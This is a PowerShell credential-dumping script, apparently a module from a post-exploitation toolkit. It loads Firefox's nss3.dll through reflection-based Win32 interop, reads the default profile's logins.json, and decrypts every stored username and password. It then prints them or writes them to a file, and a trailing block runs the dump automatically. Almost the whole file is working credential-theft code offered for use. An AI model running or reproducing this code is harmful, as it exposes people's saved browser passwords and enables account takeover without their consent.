
Function Get-FoxDump 
{
    

    #References: http://xakfor.net/threads/c-firefox-36-password-cookie-recovery.12192/

    [CmdletBinding()]
    param
    (
        [Parameter(Mandatory = $False)]
        [string]$OutFile

    )
    #PSREFLECT CODE
    function New-InMemoryModule
  {
    

        Param
        (
            [Parameter(Position = 0)]
            [ValidateNotNullOrEmpty()]
            [String]
            $ModuleName = [Guid]::NewGuid().ToString()
        )

        $LoadedAssemblies = [AppDomain]::CurrentDomain.GetAssemblies()

        foreach ($Assembly in $LoadedAssemblies) {
            if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {
                return $Assembly
            }
        }

        $DynAssembly = New-Object Reflection.AssemblyName($ModuleName)
        $Domain = [AppDomain]::CurrentDomain
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, 'Run')
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)

        return $ModuleBuilder
    }


  # A helper function used to reduce typing while defining function
  # prototypes for Add-Win32Type.
  function func
  {
        Param
        (
            [Parameter(Position = 0, Mandatory = $True)]
            [String]
            $DllName,

            [Parameter(Position = 1, Mandatory = $True)]
            [string]
            $FunctionName,

            [Parameter(Position = 2, Mandatory = $True)]
            [Type]
            $ReturnType,

            [Parameter(Position = 3)]
            [Type[]]
            $ParameterTypes,

            [Parameter(Position = 4)]
            [Runtime.InteropServices.CallingConvention]
            $NativeCallingConvention,

            [Parameter(Position = 5)]
            [Runtime.InteropServices.CharSet]
            $Charset,

            [Switch]
            $SetLastError
        )

        $Properties = @{
            DllName = $DllName
            FunctionName = $FunctionName
            ReturnType = $ReturnType
        }

        if ($ParameterTypes) { $Properties['ParameterTypes'] = $ParameterTypes }
        if ($NativeCallingConvention) { $Properties['NativeCallingConvention'] = $NativeCallingConvention }
        if ($Charset) { $Properties['Charset'] = $Charset }
        if ($SetLastError) { $Properties['SetLastError'] = $SetLastError }

        New-Object PSObject -Property $Properties
    }


  function Add-Win32Type
  {
    

        [OutputType([Hashtable])]
        Param(
            [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
            [String]
            $DllName,

            [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
            [String]
            $FunctionName,

            [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
            [Type]
            $ReturnType,

            [Parameter(ValueFromPipelineByPropertyName = $True)]
            [Type[]]
            $ParameterTypes,

            [Parameter(ValueFromPipelineByPropertyName = $True)]
            [Runtime.InteropServices.CallingConvention]
            $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,

            [Parameter(ValueFromPipelineByPropertyName = $True)]
            [Runtime.InteropServices.CharSet]
            $Charset = [Runtime.InteropServices.CharSet]::Auto,

            [Parameter(ValueFromPipelineByPropertyName = $True)]
            [Switch]
            $SetLastError,

            [Parameter(Mandatory = $True)]
            [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
            $Module,

            [ValidateNotNull()]
            [String]
            $Namespace = ''
        )

        BEGIN
        {
            $TypeHash = @{}
        }

        PROCESS
        {
            if ($Module -is [Reflection.Assembly])
            {
                if ($Namespace)
                {
                    $TypeHash[$DllName] = $Module.GetType("$Namespace.$DllName")
                }
                else
                {
                    $TypeHash[$DllName] = $Module.GetType($DllName)
                }
            }
            else
            {
                # Define one type for each DLL
                if (!$TypeHash.ContainsKey($DllName))
                {
                    if ($Namespace)
                    {
                        $TypeHash[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                    }
                    else
                    {
                        $TypeHash[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                    }
                }

                $Method = $TypeHash[$DllName].DefineMethod(
                    $FunctionName,
                    'Public,Static,PinvokeImpl',
                    $ReturnType,
                    $ParameterTypes)

                # Make each ByRef parameter an Out parameter
                $i = 1
                foreach($Parameter in $ParameterTypes)
                {
                    if ($Parameter.IsByRef)
                    {
                        [void] $Method.DefineParameter($i, 'Out', $null)
                    }

                    $i++
                }

                $DllImport = [Runtime.InteropServices.DllImportAttribute]
                $SetLastErrorField = $DllImport.GetField('SetLastError')
                $CallingConventionField = $DllImport.GetField('CallingConvention')
                $CharsetField = $DllImport.GetField('CharSet')
                if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }

                # Equivalent to C# version of [DllImport(DllName)]
                $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
                $DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                    $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                    [Reflection.FieldInfo[]] @($SetLastErrorField, $CallingConventionField, $CharsetField),
                    [Object[]] @($SLEValue, ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention), ([Runtime.InteropServices.CharSet] $Charset)))

                $Method.SetCustomAttribute($DllImportAttribute)
            }
        }

        END
        {
            if ($Module -is [Reflection.Assembly])
            {
                return $TypeHash
            }

            $ReturnTypes = @{}

            foreach ($Key in $TypeHash.Keys)
            {
                $Type = $TypeHash[$Key].CreateType()
            
                $ReturnTypes[$Key] = $Type
            }

            return $ReturnTypes
        }
    }


  function psenum
  {
    

        [OutputType([Type])]
        Param
        (
            [Parameter(Position = 0, Mandatory = $True)]
            [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
            $Module,

            [Parameter(Position = 1, Mandatory = $True)]
            [ValidateNotNullOrEmpty()]
            [String]
            $FullName,

            [Parameter(Position = 2, Mandatory = $True)]
            [Type]
            $Type,

            [Parameter(Position = 3, Mandatory = $True)]
            [ValidateNotNullOrEmpty()]
            [Hashtable]
            $EnumElements,

            [Switch]
            $Bitfield
        )

        if ($Module -is [Reflection.Assembly])
        {
            return ($Module.GetType($FullName))
        }

        $EnumType = $Type -as [Type]

        $EnumBuilder = $Module.DefineEnum($FullName, 'Public', $EnumType)

        if ($Bitfield)
        {
            $FlagsConstructor = [FlagsAttribute].GetConstructor(@())
            $FlagsCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($FlagsConstructor, @())
            $EnumBuilder.SetCustomAttribute($FlagsCustomAttribute)
        }

        foreach ($Key in $EnumElements.Keys)
        {
            # Apply the specified enum type to each element
            $null = $EnumBuilder.DefineLiteral($Key, $EnumElements[$Key] -as $EnumType)
        }

        $EnumBuilder.CreateType()
    }


  # A helper function used to reduce typing while defining struct
  # fields.
  function field
  {
        Param
        (
            [Parameter(Position = 0, Mandatory = $True)]
            [UInt16]
            $Position,
        
            [Parameter(Position = 1, Mandatory = $True)]
            [Type]
            $Type,
        
            [Parameter(Position = 2)]
            [UInt16]
            $Offset,
        
            [Object[]]
            $MarshalAs
        )

        @{
            Position = $Position
            Type = $Type -as [Type]
            Offset = $Offset
            MarshalAs = $MarshalAs
        }
    }


  function struct
  {
        

        [OutputType([Type])]
        Param
        (
            [Parameter(Position = 1, Mandatory = $True)]
            [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
            $Module,

            [Parameter(Position = 2, Mandatory = $True)]
            [ValidateNotNullOrEmpty()]
            [String]
            $FullName,

            [Parameter(Position = 3, Mandatory = $True)]
            [ValidateNotNullOrEmpty()]
            [Hashtable]
            $StructFields,

            [Reflection.Emit.PackingSize]
            $PackingSize = [Reflection.Emit.PackingSize]::Unspecified,

            [Switch]
            $ExplicitLayout
        )

        if ($Module -is [Reflection.Assembly])
        {
            return ($Module.GetType($FullName))
        }

        [Reflection.TypeAttributes] $StructAttributes = 'AnsiClass,
            Class,
            Public,
            Sealed,
            BeforeFieldInit'

        if ($ExplicitLayout)
        {
            $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::ExplicitLayout
        }
        else
        {
            $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::SequentialLayout
        }

        $StructBuilder = $Module.DefineType($FullName, $StructAttributes, [ValueType], $PackingSize)
        $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
        $SizeConst = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))

        $Fields = New-Object Hashtable[]($StructFields.Count)

        # Sort each field according to the orders specified
        # Unfortunately, PSv2 doesn't have the luxury of the
        # hashtable [Ordered] accelerator.
        foreach ($Field in $StructFields.Keys)
        {
            $Index = $StructFields[$Field]['Position']
            $Fields[$Index] = @{FieldName = $Field; Properties = $StructFields[$Field]}
        }

        foreach ($Field in $Fields)
        {
            $FieldName = $Field['FieldName']
            $FieldProp = $Field['Properties']

            $Offset = $FieldProp['Offset']
            $Type = $FieldProp['Type']
            $MarshalAs = $FieldProp['MarshalAs']

            $NewField = $StructBuilder.DefineField($FieldName, $Type, 'Public')

            if ($MarshalAs)
            {
                $UnmanagedType = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
                if ($MarshalAs[1])
                {
                    $Size = $MarshalAs[1]
                    $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo,
                        $UnmanagedType, $SizeConst, @($Size))
                }
                else
                {
                    $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, [Object[]] @($UnmanagedType))
                }
            
                $NewField.SetCustomAttribute($AttribBuilder)
            }

            if ($ExplicitLayout) { $NewField.SetOffset($Offset) }
        }

        # Make the struct aware of its own size.
        # No more having to call [Runtime.InteropServices.Marshal]::SizeOf!
        $SizeMethod = $StructBuilder.DefineMethod('GetSize',
            'Public, Static',
            [Int],
            [Type[]] @())
        $ILGenerator = $SizeMethod.GetILGenerator()
        # Thanks for the help, Jason Shirk!
        $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
        $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
            [Type].GetMethod('GetTypeFromHandle'))
        $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
            [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
        $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)

        # Allow for explicit casting from an IntPtr
        # No more having to call [Runtime.InteropServices.Marshal]::PtrToStructure!
        $ImplicitConverter = $StructBuilder.DefineMethod('op_Implicit',
            'PrivateScope, Public, Static, HideBySig, SpecialName',
            $StructBuilder,
            [Type[]] @([IntPtr]))
        $ILGenerator2 = $ImplicitConverter.GetILGenerator()
        $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Nop)
        $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
        $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
        $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
            [Type].GetMethod('GetTypeFromHandle'))
        $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
            [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
        $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $StructBuilder)
        $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)

        $StructBuilder.CreateType()
    }
    #end of PSREFLECT CODE

    #http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html

    
   
    #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
    Function Get-DelegateType
    {
        Param
        (
            [OutputType([Type])]
            
            [Parameter( Position = 0)]
            [Type[]]
            $Parameters = (New-Object Type[](0)),
            
            [Parameter( Position = 1 )]
            [Type]
            $ReturnType = [Void]
        )

        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
        $MethodBuilder.SetImplementationFlags('Runtime, Managed')
        
        Write-Output $TypeBuilder.CreateType()
    }


    $Mod = New-InMemoryModule -ModuleName Win32

    $FunctionDefinitions = @(
        (func kernel32 GetProcAddress ([IntPtr]) @([IntPtr], [string]) -Charset Ansi -SetLastError),
        (func kernel32 LoadLibrary ([IntPtr]) @([string]) -Charset Ansi -SetLastError),
        (func kernel32 FreeLibrary ([Bool]) @([IntPtr]) -Charset Ansi -SetLastError)
    )

    $TSECItem = struct $Mod TSECItem @{
        SECItemType    =    field 0 Int
        SECItemData    =    field 1 Int
        SECItemLen     =    field 2 Int
    }

    $Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
    $Kernel32 = $Types['kernel32']
    
    $nssdllhandle = [IntPtr]::Zero

    if([IntPtr]::Size -eq 8)
    {
        Throw "Unable to load 32-bit dll's in 64-bit process."
    }
    $mozillapath = "C:\Program Files (x86)\Mozilla Firefox"
    
    If(Test-Path $mozillapath)
    {
        
        
        $nss3dll = "$mozillapath\nss3.dll"
        
        $mozgluedll = "$mozillapath\mozglue.dll"
        $msvcr120dll = "$mozillapath\msvcr120.dll"
        $msvcp120dll = "$mozillapath\msvcp120.dll"
       
        if(Test-Path $msvcr120dll)
        {
         
            $msvcr120dllHandle = $Kernel32::LoadLibrary($msvcr120dll)
            $LastError= [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Verbose "Last Error when loading mozglue.dll: $LastError"
            
            
        }

        if(Test-Path $msvcp120dll)
        {
       
            $msvcp120dllHandle = $kernel32::LoadLibrary($msvcp120dll) 
            $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Verbose "Last Error loading mscvp120.dll: $LastError" 
            
        }

        if(Test-Path $mozgluedll)
        {
            
            $mozgluedllHandle = $Kernel32::LoadLibrary($mozgluedll) 
            $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Verbose "Last error loading msvcr120.dll: $LastError"
            
        }
        
        
        if(Test-Path $nss3dll)
        {
            
            $nssdllhandle = $Kernel32::LoadLibrary($nss3dll)
            $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Verbose "Last Error loading nss3.dll: $LastError"       
            
        }
    }
    

    if(($nssdllhandle -eq 0) -or ($nssdllhandle -eq [IntPtr]::Zero))
    {
        Write-Warning "Could not load nss3.dll"
        Write-Verbose "Last Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        break
    }
   

    Function Decrypt-CipherText
    {
        param
        (
            [parameter(Mandatory=$True)]
            [string]$cipherText
        )

        #Cast the result from the Decode buffer function as a TSECItem struct and create an empty struct. Decrypt the cipher text and then
        #store it inside the empty struct.
        $Result = $NSSBase64_DecodeBuffer.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $cipherText, $cipherText.Length)
        Write-Verbose "[+]NSSBase64_DecodeBuffer Result: $Result"
        $ResultPtr = $Result -as [IntPtr]
        $offset = $ResultPtr.ToInt64()
        $newptr = New-Object System.IntPtr -ArgumentList $offset
        $TSECStructData = $newptr -as $TSECItem
        $ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf($TSECStructData))
        $EmptyTSECItem = $ptr -as $TSECItem
        $result = $PK11SDR_Decrypt.Invoke([ref]$TSECStructData, [ref]$EmptyTSECItem, 0)
        Write-Verbose "[+]PK11SDR_Decrypt result:$result"
        if($result -eq 0)
        {

            if($EmptyTSECItem.SECItemLen -ne 0)
            {
                $size = $EmptyTSECItem.SECItemLen 
                $dataPtr = $EmptyTSECItem.SECItemData -as [IntPtr]
                $retval = New-Object byte[] $size
                [System.Runtime.InteropServices.Marshal]::Copy($dataPtr, $retval, 0, $size)
                $clearText = [System.Text.Encoding]::UTF8.GetString($retval)
                return $clearText
            }

        }

    }

    $NSSInitAddr = $Kernel32::GetProcAddress($nssdllhandle, "NSS_Init")
    $NSSInitDelegates = Get-DelegateType @([string]) ([long])
    $NSS_Init = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NSSInitAddr, $NSSInitDelegates)

    $NSSBase64_DecodeBufferAddr = $Kernel32::GetProcAddress($nssdllhandle, "NSSBase64_DecodeBuffer")
    $NSSBase64_DecodeBufferDelegates = Get-DelegateType @([IntPtr], [IntPtr], [string], [int]) ([int])
    $NSSBase64_DecodeBuffer = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NSSBase64_DecodeBufferAddr, $NSSBase64_DecodeBufferDelegates)

    $PK11SDR_DecryptAddr = $Kernel32::GetProcAddress($nssdllhandle, "PK11SDR_Decrypt")
    $PK11SDR_DecryptDelegates = Get-DelegateType @([Type]$TSECItem.MakeByRefType(),[Type]$TSECItem.MakeByRefType(), [int]) ([int])
    $PK11SDR_Decrypt = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($PK11SDR_DecryptAddr, $PK11SDR_DecryptDelegates)
    
    $profilePath = "$($env:APPDATA)\Mozilla\Firefox\Profiles\*.default"
    
    $defaultProfile = $(Get-ChildItem $profilePath).FullName
    $NSSInitResult = $NSS_Init.Invoke($defaultProfile)
    Write-Verbose "[+]NSS_Init result: $NSSInitResult"
    

    if(Test-Path $defaultProfile)
    {
        #Web.extensions assembly is necessary for handling json files
        try
        {
           Add-Type -AssemblyName System.web.extensions 
        }
        catch
        {
            Write-Warning "Unable to load System.web.extensions assembly"
            break
        }
        

        $jsonFile = Get-Content "$defaultProfile\logins.json"
        if(!($jsonFile))
        {
            Write-Warning "Login information cannot be found in logins.json"
            break
        }
        $ser = New-Object System.Web.Script.Serialization.JavaScriptSerializer
        $obj = $ser.DeserializeObject($jsonFile)

        
        $logins = $obj['logins']
        $count = ($logins.Count) - 1
        $passwordlist = @()
        #Iterate through each login entry and decrypt the username and password fields
        for($i = 0; $i -le $count; $i++)
        {
            Write-Verbose "[+]Decrypting login information..."
            $user = Decrypt-CipherText $($logins.GetValue($i)['encryptedUsername'])
            $pass = Decrypt-CipherText $($logins.GetValue($i)['encryptedPassword'])
            $formUrl = $($logins.GetValue($i)['formSubmitURL'])
            $FoxCreds = New-Object PSObject -Property @{
                UserName = $user 
                Password = $pass
                URL = $formUrl
            }
            $passwordlist += $FoxCreds
        }
        #Spit out the results to a file.... or not.
        if($OutFile)
        {
            $passwordlist | Format-List URL, UserName, Password | Out-File -Encoding ascii $OutFile
        }
        else
        {
            $passwordlist | Format-List URL, UserName, Password | Out-String
        }
        if ($msvcr120dllHandle) {
            $Kernel32::FreeLibrary($msvcr120dllHandle) | Out-Null
        }
        if ($mozgluedllHandle) {
            $kernel32::FreeLibrary($mozgluedllHandle) | Out-Null
        }
        if ($nssdllhandle) {
            $kernel32::FreeLibrary($nssdllhandle) | Out-Null
       }
    }
    else
    {
        Write-Warning "Unable to locate default profile"
    }
    

}

#########################################

echo "##FireFox Credentials"
echo "========================================================"
echo ""

# Update output buffer size to 500
if( $Host -and $Host.UI -and $Host.UI.RawUI ) {
  $rawUI = $Host.UI.RawUI
  $oldSize = $rawUI.BufferSize
  $typeName = $oldSize.GetType( ).FullName
  $newSize = New-Object $typeName (500, $oldSize.Height)
  $rawUI.BufferSize = $newSize
}

Get-FoxDump
echo "`n`n`n"

#########################################

